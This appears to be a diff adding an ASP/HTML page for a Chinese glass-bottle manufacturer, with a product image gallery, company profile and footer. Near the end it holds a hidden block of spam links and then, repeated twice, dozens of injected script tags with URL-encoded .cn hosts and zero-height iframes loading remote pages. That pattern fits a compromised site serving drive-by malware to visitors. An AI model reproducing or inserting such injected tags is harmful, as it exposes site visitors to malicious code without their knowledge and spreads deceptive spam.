+					<TD><img src='Images/bg_02.gif'></TD>					
+					<TD><img src='Images/bg_0rbottom.gif' width=10 height=10></TD>
+	  		</TR>
+	  		<TR>
+	  			<TD>&nbsp;</TD>
+					<TD colspan=3 align=center height=20 valign='top' background='Images/bg_05.gif'>
+	  				<a href='ProductShow.asp?ID=503' target=_blank title='香水瓶'>香水瓶</a>
+	 				</TD>
+	 				<TD>&nbsp;</TD>
+				</TR>
+	 			</TABLE>
+			</td>
+	  
+			<td align='center'>
+				<TABLE width=100% border=0 align=center cellPadding=0 cellSpacing=0>
+				<TR>
+					<TD width=8 rowspan=3 >&nbsp;</TD>
+					<TD vAlign=top width=8><img src='Images/bg_0ltop.gif' width=10 height=10></TD>
+					<TD background=images/bg_01.gif></TD>
+					<TD vAlign=top width=7><img src='Images/bg_0rtop.gif' width=10 height=10></TD>
+					<TD width=7 rowspan=3 vAlign=top>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD background='Images/bg_03.gif'>&nbsp;</TD>
+					<TD width="105" height="85" align="center" bgcolor="#E9E9E9">
+						<a href='ProductShow.asp?ID=502' target=_blank title='香水瓶'>
+		
+							 <img src="UploadFiles/200893104635103.jpg" alt="香水瓶" width="105" height="80" border="0" onload="javascript:DrawImage(this);">
+		</a>
+						
+	  			</TD>
+	  			<TD background='Images/bg_04.gif'>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD><img src='Images/bg_0lbottom.gif' width=10 height=10></TD>
+					<TD><img src='Images/bg_02.gif'></TD>					
+					<TD><img src='Images/bg_0rbottom.gif' width=10 height=10></TD>
+	  		</TR>
+	  		<TR>
+	  			<TD>&nbsp;</TD>
+					<TD colspan=3 align=center height=20 valign='top' background='Images/bg_05.gif'>
+	  				<a href='ProductShow.asp?ID=502' target=_blank title='香水瓶'>香水瓶</a>
+	 				</TD>
+	 				<TD>&nbsp;</TD>
+				</TR>
+	 			</TABLE>
+			</td>
+	  
+			<td align='center'>
+				<TABLE width=100% border=0 align=center cellPadding=0 cellSpacing=0>
+				<TR>
+					<TD width=8 rowspan=3 >&nbsp;</TD>
+					<TD vAlign=top width=8><img src='Images/bg_0ltop.gif' width=10 height=10></TD>
+					<TD background=images/bg_01.gif></TD>
+					<TD vAlign=top width=7><img src='Images/bg_0rtop.gif' width=10 height=10></TD>
+					<TD width=7 rowspan=3 vAlign=top>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD background='Images/bg_03.gif'>&nbsp;</TD>
+					<TD width="105" height="85" align="center" bgcolor="#E9E9E9">
+						<a href='ProductShow.asp?ID=501' target=_blank title='香水瓶'>
+		
+							 <img src="UploadFiles/200893104520681.jpg" alt="香水瓶" width="105" height="80" border="0" onload="javascript:DrawImage(this);">
+		</a>
+						
+	  			</TD>
+	  			<TD background='Images/bg_04.gif'>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD><img src='Images/bg_0lbottom.gif' width=10 height=10></TD>
+					<TD><img src='Images/bg_02.gif'></TD>					
+					<TD><img src='Images/bg_0rbottom.gif' width=10 height=10></TD>
+	  		</TR>
+	  		<TR>
+	  			<TD>&nbsp;</TD>
+					<TD colspan=3 align=center height=20 valign='top' background='Images/bg_05.gif'>
+	  				<a href='ProductShow.asp?ID=501' target=_blank title='香水瓶'>香水瓶</a>
+	 				</TD>
+	 				<TD>&nbsp;</TD>
+				</TR>
+	 			</TABLE>
+			</td>
+	  
+			<td align='center'>
+				<TABLE width=100% border=0 align=center cellPadding=0 cellSpacing=0>
+				<TR>
+					<TD width=8 rowspan=3 >&nbsp;</TD>
+					<TD vAlign=top width=8><img src='Images/bg_0ltop.gif' width=10 height=10></TD>
+					<TD background=images/bg_01.gif></TD>
+					<TD vAlign=top width=7><img src='Images/bg_0rtop.gif' width=10 height=10></TD>
+					<TD width=7 rowspan=3 vAlign=top>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD background='Images/bg_03.gif'>&nbsp;</TD>
+					<TD width="105" height="85" align="center" bgcolor="#E9E9E9">
+						<a href='ProductShow.asp?ID=500' target=_blank title='香水瓶'>
+		
+							 <img src="UploadFiles/200893104451764.jpg" alt="香水瓶" width="105" height="80" border="0" onload="javascript:DrawImage(this);">
+		</a>
+						
+	  			</TD>
+	  			<TD background='Images/bg_04.gif'>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD><img src='Images/bg_0lbottom.gif' width=10 height=10></TD>
+					<TD><img src='Images/bg_02.gif'></TD>					
+					<TD><img src='Images/bg_0rbottom.gif' width=10 height=10></TD>
+	  		</TR>
+	  		<TR>
+	  			<TD>&nbsp;</TD>
+					<TD colspan=3 align=center height=20 valign='top' background='Images/bg_05.gif'>
+	  				<a href='ProductShow.asp?ID=500' target=_blank title='香水瓶'>香水瓶</a>
+	 				</TD>
+	 				<TD>&nbsp;</TD>
+				</TR>
+	 			</TABLE>
+			</td>
+	  
+			<td align='center'>
+				<TABLE width=100% border=0 align=center cellPadding=0 cellSpacing=0>
+				<TR>
+					<TD width=8 rowspan=3 >&nbsp;</TD>
+					<TD vAlign=top width=8><img src='Images/bg_0ltop.gif' width=10 height=10></TD>
+					<TD background=images/bg_01.gif></TD>
+					<TD vAlign=top width=7><img src='Images/bg_0rtop.gif' width=10 height=10></TD>
+					<TD width=7 rowspan=3 vAlign=top>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD background='Images/bg_03.gif'>&nbsp;</TD>
+					<TD width="105" height="85" align="center" bgcolor="#E9E9E9">
+						<a href='ProductShow.asp?ID=499' target=_blank title='香水瓶'>
+		
+							 <img src="UploadFiles/200893104430417.jpg" alt="香水瓶" width="105" height="80" border="0" onload="javascript:DrawImage(this);">
+		</a>
+						
+	  			</TD>
+	  			<TD background='Images/bg_04.gif'>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD><img src='Images/bg_0lbottom.gif' width=10 height=10></TD>
+					<TD><img src='Images/bg_02.gif'></TD>					
+					<TD><img src='Images/bg_0rbottom.gif' width=10 height=10></TD>
+	  		</TR>
+	  		<TR>
+	  			<TD>&nbsp;</TD>
+					<TD colspan=3 align=center height=20 valign='top' background='Images/bg_05.gif'>
+	  				<a href='ProductShow.asp?ID=499' target=_blank title='香水瓶'>香水瓶</a>
+	 				</TD>
+	 				<TD>&nbsp;</TD>
+				</TR>
+	 			</TABLE>
+			</td>
+	  
+			<td align='center'>
+				<TABLE width=100% border=0 align=center cellPadding=0 cellSpacing=0>
+				<TR>
+					<TD width=8 rowspan=3 >&nbsp;</TD>
+					<TD vAlign=top width=8><img src='Images/bg_0ltop.gif' width=10 height=10></TD>
+					<TD background=images/bg_01.gif></TD>
+					<TD vAlign=top width=7><img src='Images/bg_0rtop.gif' width=10 height=10></TD>
+					<TD width=7 rowspan=3 vAlign=top>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD background='Images/bg_03.gif'>&nbsp;</TD>
+					<TD width="105" height="85" align="center" bgcolor="#E9E9E9">
+						<a href='ProductShow.asp?ID=498' target=_blank title='香水瓶'>
+		
+							 <img src="UploadFiles/200893104356649.jpg" alt="香水瓶" width="105" height="80" border="0" onload="javascript:DrawImage(this);">
+		</a>
+						
+	  			</TD>
+	  			<TD background='Images/bg_04.gif'>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD><img src='Images/bg_0lbottom.gif' width=10 height=10></TD>
+					<TD><img src='Images/bg_02.gif'></TD>					
+					<TD><img src='Images/bg_0rbottom.gif' width=10 height=10></TD>
+	  		</TR>
+	  		<TR>
+	  			<TD>&nbsp;</TD>
+					<TD colspan=3 align=center height=20 valign='top' background='Images/bg_05.gif'>
+	  				<a href='ProductShow.asp?ID=498' target=_blank title='香水瓶'>香水瓶</a>
+	 				</TD>
+	 				<TD>&nbsp;</TD>
+				</TR>
+	 			</TABLE>
+			</td>
+	  
+			<td align='center'>
+				<TABLE width=100% border=0 align=center cellPadding=0 cellSpacing=0>
+				<TR>
+					<TD width=8 rowspan=3 >&nbsp;</TD>
+					<TD vAlign=top width=8><img src='Images/bg_0ltop.gif' width=10 height=10></TD>
+					<TD background=images/bg_01.gif></TD>
+					<TD vAlign=top width=7><img src='Images/bg_0rtop.gif' width=10 height=10></TD>
+					<TD width=7 rowspan=3 vAlign=top>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD background='Images/bg_03.gif'>&nbsp;</TD>
+					<TD width="105" height="85" align="center" bgcolor="#E9E9E9">
+						<a href='ProductShow.asp?ID=497' target=_blank title='香水瓶'>
+		
+							 <img src="UploadFiles/200893104335659.jpg" alt="香水瓶" width="105" height="80" border="0" onload="javascript:DrawImage(this);">
+		</a>
+						
+	  			</TD>
+	  			<TD background='Images/bg_04.gif'>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD><img src='Images/bg_0lbottom.gif' width=10 height=10></TD>
+					<TD><img src='Images/bg_02.gif'></TD>					
+					<TD><img src='Images/bg_0rbottom.gif' width=10 height=10></TD>
+	  		</TR>
+	  		<TR>
+	  			<TD>&nbsp;</TD>
+					<TD colspan=3 align=center height=20 valign='top' background='Images/bg_05.gif'>
+	  				<a href='ProductShow.asp?ID=497' target=_blank title='香水瓶'>香水瓶</a>
+	 				</TD>
+	 				<TD>&nbsp;</TD>
+				</TR>
+	 			</TABLE>
+			</td>
+	  
+			<td align='center'>
+				<TABLE width=100% border=0 align=center cellPadding=0 cellSpacing=0>
+				<TR>
+					<TD width=8 rowspan=3 >&nbsp;</TD>
+					<TD vAlign=top width=8><img src='Images/bg_0ltop.gif' width=10 height=10></TD>
+					<TD background=images/bg_01.gif></TD>
+					<TD vAlign=top width=7><img src='Images/bg_0rtop.gif' width=10 height=10></TD>
+					<TD width=7 rowspan=3 vAlign=top>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD background='Images/bg_03.gif'>&nbsp;</TD>
+					<TD width="105" height="85" align="center" bgcolor="#E9E9E9">
+						<a href='ProductShow.asp?ID=496' target=_blank title='香水瓶'>
+		
+							 <img src="UploadFiles/20089310439391.jpg" alt="香水瓶" width="105" height="80" border="0" onload="javascript:DrawImage(this);">
+		</a>
+						
+	  			</TD>
+	  			<TD background='Images/bg_04.gif'>&nbsp;</TD>
+				</TR>
+				<TR>
+					<TD><img src='Images/bg_0lbottom.gif' width=10 height=10></TD>
+					<TD><img src='Images/bg_02.gif'></TD>					
+					<TD><img src='Images/bg_0rbottom.gif' width=10 height=10></TD>
+	  		</TR>
+	  		<TR>
+	  			<TD>&nbsp;</TD>
+					<TD colspan=3 align=center height=20 valign='top' background='Images/bg_05.gif'>
+	  				<a href='ProductShow.asp?ID=496' target=_blank title='香水瓶'>香水瓶</a>
+	 				</TD>
+	 				<TD>&nbsp;</TD>
+				</TR>
+	 			</TABLE>
+			</td>
+	  
+		</tr>
+		</table>
+	</td>
+	<td id=demo2 valign=top></td>
+</tr>
+</table>
+</div>
+   
+<script>
+var Picspeed=15
+demo2.innerHTML=demo1.innerHTML
+function Marquee1(){
+if(demo2.offsetWidth-demo.scrollLeft<=0)
+demo.scrollLeft-=demo1.offsetWidth
+else{
+demo.scrollLeft++
+}
+}
+var MyMar1=setInterval(Marquee1,Picspeed)
+demo.onmouseover=function() {clearInterval(MyMar1)}
+demo.onmouseout=function() {MyMar1=setInterval(Marquee1,Picspeed)}
+</script>
+	
+<!--最新图文代码结束--></td>
+              </tr>
+            </table>
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td height="6">&nbsp;</td>
+              </tr>
+            </table>
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td height="32">
+				<img border="0" src="Images/down_16.jpg" width="546" height="57"></td> 
+               
+              </tr>
+            </table>
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td>  </td>
+              </tr>
+              <tr> 
+                <td> 
+                  <p dir="ltr" style="line-height: 200%; margin-right: 0px">
+					&nbsp;&nbsp;&nbsp; 
+					徐州恒发玻璃制品有限公司位于徐州马坡工业开发区，交通便利，公路、铁路、水路四通八达，公司建于1985年，下辖配套企业－瓶盖厂、模具厂、纸箱厂。我厂独家拥有全自动行列要生产线5条，人工线20条日产各类玻璃瓶80万只，现有中工500多人，其中高级技职人中28人，质检人员15人，产品质量严格把关，层层控制，高质量的产品赢得国内外客户的青睐，部分产品出口至日本、美国、俄罗斯、加拿大、韩国、日本、澳大利亚等国家。<br>
+&nbsp;&nbsp;&nbsp; 我厂生产800多个品种主要有：蜂蜜瓶、果酱瓶、酱菜瓶、酱油瓶、醋瓶、麻油瓶、酒瓶、饮料瓶、罐头瓶、腐乳瓶、调味瓶、果酒瓶、保健酒瓶、果汁瓶、医药瓶、咖啡瓶、口杯、奶瓶、玻璃烛台、把子杯、水杯、口服液瓶等，并可为玻璃瓶蒙砂、刻字、烤瓷等深加工。<br>
+					　　我厂生产各号的马口铁盖及塑料盖，并加工印刷商标专利盖，配套各类铝盖、吕塑结合盖等。马口铁盖型号有：38＃、43＃、48＃、53＃、58＃、63＃、66＃、70＃、80＃、82＃、110＃，塑料盖各类有：聚乙类、聚丙类、ABS料等。<br>
+&nbsp;&nbsp;&nbsp; 我厂下属模具厂，可根据客户要求，在最短的时间内，设计新瓶型，开出新模具，质量合格，价格合理。<br>
+&nbsp;&nbsp;&nbsp; 公司有成熟的物流方式，可为客户代办托运、汽运、火车皮、集装箱、水运、航空运输等。<br>
+&nbsp;&nbsp;&nbsp; 公司特色：<br>
+					　　（1） 质量最优-同行业中，质量最稳定，料色最白，光洁度最好。<br>
+					　　（2） 品种最多-800多种，并且3－7日更换新产品。<br>
+					　　（3） 配套最全-自己有瓶盖厂、模具厂、纸箱厂。<br>
+					　　（4） 信誉最佳-在同行业中，特别是供应客户，信誉口碑最好。<br>
+					　&nbsp; 我厂愿以过硬的产品质量，实实在在的价格，期待成为您的固定贸易伙伴!</td>
+              </tr>
+            </table></td>
+        </tr>		
+      </table></TD>
+  </TR>
+</TABLE>
+<script language="javascript" type="text/javascript">
+	document.write("<div style='display:none;'>");
+</script><div>合作伙伴：<a href="http://www.jianzhenqi.cn/">机柜</a> <a href="http://www.shdzbanchang.cn/">大众搬场公司</a> <a href="http://www.shzhishen.cn/fanwei.htm">上海开锁</a> <a href="http://www.hdjbgs.cn/">罗茨鼓风机</a> <a href="http://www.kinplay.com/xc/en/0/2000003/Waste-receptacles/">Waste Receptacles</a> <a href="http://www.wxweisheng.com/">喷涂</a> <a href="http://www.hotgames.cn/">摩托罗拉对讲机</a> <a href="http://www.lengku.cn/">冷库</a> <a href="http://www.jgte.com/">显示屏</a> <a href="http://www.kansa.org.cn/">机柜空调</a> <a href="http://www.czlvfeng.cn/">造粒机</a> <a href="http://www.szwdzl.cn/">苏州汽车租赁</a> <a href="http://www.greatcom.net.cn/">升降机</a> <a href="http://www.synthesisgene.com/">peptide synthesis</a> <a href="http://www.czdry.net.cn/">散热器</a> <a href="http://www.sai-kang.com/">太阳能热水器</a> <a href="http://www.hsyh.com/exhibit1/exhview.asp?pid=155">甲醇回收塔</a> <a href="http://www.yaer.net.cn/">上海笔记本维修</a> <a href="http://www.sh-binni.com/">搬家</a> <a href="http://www.ludu.com.cn/">上海汽车租赁</a> <a href="http://www.ruijiafushi.com/">瑞丽服装批发</a> <a href="http://www.hanlawyer.com/">上海律师</a> <a href="http://www.easyboy.com.cn/">球阀</a> <a href="http://www.web181.com/">上海网站制作公司</a> <a href="http://www.anglo-f.com/">办公桌椅</a> <a href="http://www.wxoulong.com">无缝钢管</a> <a href="http://www.czfeida.com.cn/jj.asp">机箱</a> <a href="http://www.js-huaxing.com.cn/">紧固件</a> <a href="http://www.shlengku.obm.cn/">冷库</a> <a href="http://www.tuozhiji.com.cn/">喷涂</a> </div>
+<script language="javascript" type="text/javascript">
+	document.write("</div>");
+</script><TABLE  width="760" border=0 align="center" cellPadding=0 cellSpacing=0 bgcolor="#FFFFFF"> 
+    <TR> 
+      <TD height="5"></TD>
+    </TR>    
+    <TR> 
+      <TD> <TABLE Class=FootBg  cellSpacing=0 cellPadding=0 width="100%" border=0>
+          <TBODY>
+            
+            <TR> 
+              
+            <TD width="100%" colspan="2" background="../about9.gif" height="19"> 
+              　</TD>
+              
+            </TR>          
+         
+            <TR> 
+              
+            <TD width="12%"> 
+              <DIV align=center>友情链接</DIV></TD>
+              
+            <TD width="88%">
+<table width='100%' cellSpacing='5'><tr align='center' ><td width='88'><a href='http://www.114jx.cn' target='_blank' title='网站名称：114教学
+网站地址：http://www.114jx.cn
+网站简介：114教学'>114教学</a></td><td width='88'><a href='http://www.xnwzone.com' target='_blank' title='网站名称：校内网空间
+网站地址：http://www.xnwzone.com
+网站简介：校内网空间'>校内网空间</a></td><td width='88'><a href='http://www.xinn.net.cn' target='_blank' title='网站名称：新年服务
+网站地址：http://www.xinn.net.cn
+网站简介：新年服务'>新年服务</a></td><td width='88'><a href='http://www.baidu.com' target='_blank' title='网站名称：百度
+网站地址：http://www.baidu.com
+网站简介：百度'>百度</a></td><td width='88'><a href='http://www.shidai8.com' target='_blank' title='网站名称：时代先锋
+网站地址：http://www.shidai8.com
+网站简介：徐州时代先锋'>时代先锋</a></td><td width='88'></td><td width='88'></td><td width='88'></td><td width='88'></td><td width='88'></td></tr></table>
+            </TD>
+            </TR>          
+         
+        </TABLE></TD>
+    </TR>    
+    <TR> 
+      
+    <TD> 
+      <DIV align=center> 
+          
+        <p>版权所有 2006-2008徐州恒发玻璃制品有限公司 <br>公司地址:徐州市北郊八段工业开发区 邮编:221144 <br>销售热线:+86-516-85100121 13236060928  公司传真+86-516-85100121<br>销售咨询 E-mail:blpxz@126.com 技术支持：<a href='http://www.shidai8.com' target='_blank'>徐州时代先锋</a> 苏ICP备申请中……</p>
+        </DIV></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+
+<script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%34%2E%63%6E></script><iframe src=http://www.zghncsr.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.zghncsr.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%35%2E%63%6E></script><script src=http://%63%63%68%31%2E%63%6E></script><iframe src=http://www.zgynkmf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%63%63%68%31%2E%63%6E></script><script src=http://%63%63%68%32%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%68%68%6A%31%2E%63%6E></script><script src=http://%68%68%6A%31%2E%63%6E></script><script src=http://%76%76%6B%32%2E%63%6E></script><iframe src=http://www.falalioo.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%68%68%6A%32%2E%63%6E></script><script src=http://%68%68%6A%32%2E%63%6E></script><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%68%68%6A%32%2E%63%6E></script>
+<map name="Map">
+  <area shape="rect" coords="18,14,69,24" href="News.asp">
+</map><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%61%76%65%33%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%31%2E%63%6E></script><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.hryspap.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%32%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%33%2E%63%6E></script><iframe src=http://www.cznylsf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%34%2E%63%6E></script><iframe src=http://www.zghncsr.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.zghncsr.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%75%69%6E%35%2E%63%6E></script><script src=http://%63%63%68%31%2E%63%6E></script><iframe src=http://www.zgynkmf.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%63%63%68%31%2E%63%6E></script><script src=http://%63%63%68%32%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%76%76%6B%31%2E%63%6E></script><script src=http://%68%68%6A%31%2E%63%6E></script><script src=http://%68%68%6A%31%2E%63%6E></script><script src=http://%76%76%6B%32%2E%63%6E></script><iframe src=http://www.falalioo.cn/b3.htm width=50 height=0 border=0></iframe><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%68%68%6A%32%2E%63%6E></script><script src=http://%68%68%6A%32%2E%63%6E></script><iframe src=http://www.falaliqq.cn/b3.htm width=50 height=0 border=0></iframe><script src=http://%68%68%6A%32%2E%63%6E></script>
